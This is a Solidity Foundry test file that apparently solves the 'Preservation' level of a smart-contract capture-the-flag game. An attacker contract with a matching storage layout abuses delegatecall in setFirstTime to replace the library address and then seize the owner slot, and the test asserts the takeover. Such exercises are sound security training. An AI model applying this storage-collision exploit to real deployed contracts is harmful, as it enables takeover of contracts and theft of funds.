// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/16_Preservation.sol";

contract AttackContract {
    uint256 slot0;
    uint256 slot1;
    uint256 owner;

    function setTime(uint256 _time) public {
        owner = _time;
    }
} 

contract PreservationTest is Test {
    Preservation public pv;
    LibraryContract public lb1;
    LibraryContract public lb2;
    AttackContract public ac;

    address public hacker = address(0x1337);

    function setUp() public {
        lb1 = new LibraryContract();
        lb2 = new LibraryContract();
        pv = new Preservation(address(lb1), address(lb2));
        ac = new AttackContract();
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        pv.setFirstTime(uint160(address(ac)));
        assertEq(pv.timeZone1Library(), address(ac));
        pv.setFirstTime(uint160(hacker));
        assertEq(pv.owner(), hacker);
        vm.stopPrank();

    }
}